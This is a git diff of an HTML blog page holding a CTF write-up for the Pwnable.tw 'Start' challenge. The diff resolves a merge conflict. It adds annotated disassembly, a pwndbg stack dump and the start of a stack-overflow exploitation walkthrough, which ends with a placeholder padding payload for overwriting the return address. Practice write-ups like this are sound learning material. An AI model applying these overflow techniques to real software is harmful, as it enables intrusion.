@@ -15,19 +15,11 @@
   <meta name="viewport" content="width=device-width, initial-scale=1">
 
   <meta property="og:type" content="website">
-<<<<<<< HEAD
   <meta property="og:title" content="Pwnable_Start">
   <meta property="og:description" content="A 100-point challenge from Pwnable.tw">
 
   <title>Pwnable_Start</title>
   <meta name="description" content="A 100-point challenge from Pwnable.tw">
-=======
-  <meta property="og:title" content="Pwnable &amp;#58; Start">
-  <meta property="og:description" content="A 100-point challenge from pwnable">
-
-  <title>Pwnable &amp;#58; Start</title>
-  <meta name="description" content="A 100-point challenge from pwnable">
->>>>>>> 33c7eaa20d1c34d77055c270de6be20a54aac1fb
 
   <link rel="shortcut icon" type="image/x-icon" href="/assets/favicon.ico">
 
@@ -74,12 +66,11 @@
 
 </nav>
     <div class="col-lg-10 mx-auto mt-5 markdown-body">
-<<<<<<< HEAD
   <h1><b>Pwnable_Start</b></h1>
 
 <p class="post-metadata text-muted">
   28 June 2022 -  
-  <b>4 mins read time</b>
+  <b>6 mins read time</b>
 
   <br></p>
 
@@ -89,9 +80,9 @@
 
 <p><b>Write-up by:</b><span style="color:#007bff"> https://github.com/heckintosh </span></p>
 
-<p>A typical stack overflow with a little twist. For these first few challenges, I like to write in details so that I (and the readers) can remember the basic and fundamentals well.</p>
+<p>A typical buffer overflow attack with a little twist. For these first few challenges, I like to write in details so that I (and the readers) can remember the basic and fundamentals well.</p>
 
-<h2 id="initial-analysis">Initial Analysis</h2>
+<h2 id="1-initial-analysis">1. Initial Analysis</h2>
 <p>First we get the type of the file.</p>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>file start                                   
 start: ELF 32-bit LSB executable, Intel 80386, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, statically linked, not stripped
@@ -120,7 +111,7 @@ Non-debugging symbols:
 0x080490a4  _end  
 </code></pre></div></div>
 
-<h2 id="assembly-analysis">Assembly Analysis</h2>
+<h2 id="2-assembly-analysis">2. Assembly Analysis</h2>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; start
 pwndbg&gt; disass
 Dump of assembler code for function _start:
@@ -131,11 +122,11 @@ Dump of assembler code for function _start:
 <span class="err">0</span><span class="nf">x08048068</span> <span class="o">&lt;+</span><span class="mi">8</span><span class="o">&gt;</span><span class="p">:</span>     <span class="nv">xor</span>    <span class="nb">ebx</span><span class="p">,</span><span class="nb">ebx</span>
 <span class="err">0</span><span class="nf">x0804806a</span> <span class="o">&lt;+</span><span class="mi">10</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">xor</span>    <span class="nb">ecx</span><span class="p">,</span><span class="nb">ecx</span>
 <span class="err">0</span><span class="nf">x0804806c</span> <span class="o">&lt;+</span><span class="mi">12</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">xor</span>    <span class="nb">edx</span><span class="p">,</span><span class="nb">edx</span>
-<span class="err">0</span><span class="nf">x0804806e</span> <span class="o">&lt;+</span><span class="mi">14</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">push</span>   <span class="mh">0x3a465443</span>              <span class="o">//</span> <span class="nv">CTF</span>
-<span class="err">0</span><span class="nf">x08048073</span> <span class="o">&lt;+</span><span class="mi">19</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">push</span>   <span class="mh">0x20656874</span>              <span class="o">//</span> <span class="p">(</span><span class="s">'the '</span><span class="p">)</span>
-<span class="err">0</span><span class="nf">x08048078</span> <span class="o">&lt;+</span><span class="mi">24</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">push</span>   <span class="mh">0x20747261</span>              <span class="o">//</span> <span class="p">(</span><span class="s">'art '</span><span class="p">)</span>
-<span class="err">0</span><span class="nf">x0804807d</span> <span class="o">&lt;+</span><span class="mi">29</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">push</span>   <span class="mh">0x74732073</span>              <span class="o">//</span> <span class="p">(</span><span class="s">'s st'</span><span class="p">)</span>
-<span class="err">0</span><span class="nf">x08048082</span> <span class="o">&lt;+</span><span class="mi">34</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">push</span>   <span class="mh">0x2774654c</span>              <span class="o">//</span> <span class="p">(</span><span class="s">"Let'"</span><span class="p">)</span>
+<span class="err">0</span><span class="nf">x0804806e</span> <span class="o">&lt;+</span><span class="mi">14</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">push</span>   <span class="mh">0x3a465443</span>              <span class="o">//</span> <span class="nv">PUSH</span> <span class="nv">CTF</span>
+<span class="err">0</span><span class="nf">x08048073</span> <span class="o">&lt;+</span><span class="mi">19</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">push</span>   <span class="mh">0x20656874</span>              <span class="o">//</span> <span class="nv">PUSH</span> <span class="p">(</span><span class="s">'the '</span><span class="p">)</span>
+<span class="err">0</span><span class="nf">x08048078</span> <span class="o">&lt;+</span><span class="mi">24</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">push</span>   <span class="mh">0x20747261</span>              <span class="o">//</span> <span class="nv">PUSH</span> <span class="p">(</span><span class="s">'art '</span><span class="p">)</span>
+<span class="err">0</span><span class="nf">x0804807d</span> <span class="o">&lt;+</span><span class="mi">29</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">push</span>   <span class="mh">0x74732073</span>              <span class="o">//</span> <span class="nv">PUSH</span> <span class="p">(</span><span class="s">'s st'</span><span class="p">)</span>
+<span class="err">0</span><span class="nf">x08048082</span> <span class="o">&lt;+</span><span class="mi">34</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">push</span>   <span class="mh">0x2774654c</span>              <span class="o">//</span> <span class="nv">PUSH</span> <span class="p">(</span><span class="s">"Let'"</span><span class="p">)</span>
 <span class="err">0</span><span class="nf">x08048087</span> <span class="o">&lt;+</span><span class="mi">39</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="nb">ecx</span><span class="p">,</span><span class="nb">esp</span>                 <span class="o">//</span> <span class="nb">Ecx</span> <span class="nv">contains</span> <span class="nv">the</span> <span class="nb">ch</span><span class="nv">ar</span> <span class="nv">pointer</span> <span class="nv">to</span> <span class="nv">the</span> <span class="nv">string</span> <span class="nv">one</span> <span class="nv">wants</span> <span class="nv">to</span> <span class="nv">print.</span> <span class="nv">In</span> <span class="nv">this</span> <span class="nv">case</span> <span class="nv">it</span> <span class="nv">is</span> <span class="nv">the</span> <span class="nb">ESP</span><span class="nv">.</span>
 <span class="err">0</span><span class="nf">x08048089</span> <span class="o">&lt;+</span><span class="mi">41</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="nb">dl</span><span class="p">,</span><span class="mh">0x14</span>                 <span class="o">//</span> <span class="nb">dl</span> <span class="p">(</span><span class="nb">edx</span><span class="p">)</span> <span class="nv">contains</span> <span class="nv">the</span> <span class="nb">si</span><span class="nv">ze</span> <span class="nv">of</span> <span class="nv">the</span> <span class="nb">ch</span><span class="nv">ar</span> <span class="nv">array</span> <span class="nv">ones</span> <span class="nv">want</span> <span class="nv">to</span> <span class="nv">print.</span> <span class="mh">0x14</span> <span class="err">=</span> <span class="mi">20</span> <span class="kt">byte</span><span class="nv">s</span> <span class="nv">just</span> <span class="nv">enough</span> <span class="nv">for</span> <span class="nv">the</span> <span class="nv">string</span>
 <span class="err">0</span><span class="nf">x0804808b</span> <span class="o">&lt;+</span><span class="mi">43</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="nb">bl</span><span class="p">,</span><span class="mh">0x1</span>                  <span class="o">//</span> <span class="nb">bl</span> <span class="p">(</span><span class="nb">ebx</span><span class="p">)</span> <span class="nv">defines</span> <span class="nv">file</span> <span class="nv">descriptor.</span> <span class="mi">1</span> <span class="nv">means</span> <span class="nv">STDOUT</span>
@@ -151,25 +142,46 @@ Dump of assembler code for function _start:
 
 <p>Understand the code and you can move on to the next step.</p>
 
-<h3 id="binary-exploitation">Binary Exploitation</h3>
-=======
-  <h1><b>Pwnable &#58; Start</b></h1>
+<h2 id="3-exploitation">3. Exploitation</h2>
 
-<p class="post-metadata text-muted">
-  28 June 2022 -  
-  <b>less than 1 min read time</b>
+<h4 id="locating-the-buffer">Locating the buffer</h4>
+<p>In order to overflow the buffer, we have to know where it is. As you can see the syscall write has ecx denoting the start of the buffer. The size of the buffer is 20 bytes.</p>
 
-  <br></p>
+<p>[Add image here]</p>
 
-<h1 id="pwnable-start-writeup">Pwnable Start Writeup</h1>
+<p>Let’s focus on these instructions, which is where you can give input:</p>
 
-<p>This challenge is a classic stack overflow. For this challenge, I’d like to write things in details so that I can remember basic and fundamental stuff easier.</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x08048091</span> <span class="o">&lt;+</span><span class="mi">49</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">xor</span>    <span class="nb">ebx</span><span class="p">,</span><span class="nb">ebx</span>         <span class="o">//</span> <span class="nv">fd</span> <span class="err">=</span> <span class="mi">0</span> <span class="err">==</span><span class="o">&gt;</span> <span class="nv">STDIN</span>
+<span class="err">0</span><span class="nf">x08048093</span> <span class="o">&lt;+</span><span class="mi">51</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="nb">dl</span><span class="p">,</span><span class="mh">0x3c</span>         <span class="o">//</span> <span class="nv">Read</span> <span class="nv">up</span> <span class="nv">to</span> <span class="mi">60</span> <span class="kt">byte</span><span class="nv">s</span> <span class="nv">from</span> <span class="nv">user</span> <span class="nv">input.</span>
+<span class="err">0</span><span class="nf">x08048095</span> <span class="o">&lt;+</span><span class="mi">53</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">mov</span>    <span class="nb">al</span><span class="p">,</span><span class="mh">0x3</span>          <span class="o">//</span> <span class="mi">3</span> <span class="nv">means</span> <span class="nv">read.</span>
+<span class="err">0</span><span class="nf">x08048097</span> <span class="o">&lt;+</span><span class="mi">55</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">int</span>    <span class="mh">0x80</span>            <span class="o">//</span> <span class="nv">syscall</span><span class="p">,</span> <span class="nv">the</span> <span class="nv">missing</span> <span class="nb">ecx</span> <span class="nv">is</span> <span class="nv">taken</span> <span class="nv">from</span> <span class="nv">the</span> <span class="nv">above</span><span class="p">,</span> <span class="nv">which</span> <span class="nv">means</span> <span class="nv">user</span> <span class="nv">input</span> <span class="nv">will</span> <span class="nv">be</span> <span class="nv">written</span> <span class="nv">to</span> <span class="nv">the</span> <span class="nv">stack.</span>
+</code></pre></div></div>
 
-<p>```bash
-$ file start
-start: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped
-``</p>
->>>>>>> 33c7eaa20d1c34d77055c270de6be20a54aac1fb
+<p>So whatever you input will overwrite the stack defined by the instructions before. I inputed test and you can see what happens to the stack below.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>──────────────────────────────────────[ STACK ]───────────────────────────────────────────────
+00:0000│ ecx esp 0xffffce04 ◂— 0x74736574 ('test')
+01:0004│         0xffffce08 ◂— 0x7473200a ('\n st')
+02:0008│         0xffffce0c ◂— 0x20747261 ('art ')
+03:000c│         0xffffce10 ◂— 0x20656874 ('the ')
+04:0010│         0xffffce14 ◂— 0x3a465443 ('CTF:')
+05:0014│         0xffffce18 —▸ 0x804809d (_exit) ◂— pop    esp
+06:0018│         0xffffce1c —▸ 0xffffce20 ◂— 0x1
+07:001c│         0xffffce20 ◂— 0x1
+</code></pre></div></div>
+
+<p>The following instructions clean ups 20 bytes the stack, essentially leaves the ret at 0xffffce18 —▸ 0x804809d (_exit) ◂— pop    esp</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x08048099</span> <span class="o">&lt;+</span><span class="mi">57</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">add</span>    <span class="nb">esp</span><span class="p">,</span><span class="mh">0x14</span>                <span class="o">//</span> <span class="nb">cl</span><span class="nv">ean</span> <span class="nv">stack</span>
+<span class="err">0</span><span class="nf">x0804809c</span> <span class="o">&lt;+</span><span class="mi">60</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nv">ret</span> 
+</code></pre></div></div>
+
+<p>So our mission is to overflow the 0xffffce18 address (the _exit function) and it will return to whatever address we want. We have a padding of 20 bytes and 4 bytes payload to overwrite the address.</p>
+
+<h4 id="overwrite-the-return-address">Overwrite the return address</h4>
+<p>Now we just overwrite the exit address with 0xffffce04, which is top of the stack. So our payload will look something like this:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AAAAAAAAAAAAAAAAAAAABBBB
+</code></pre></div></div>
 
 
 
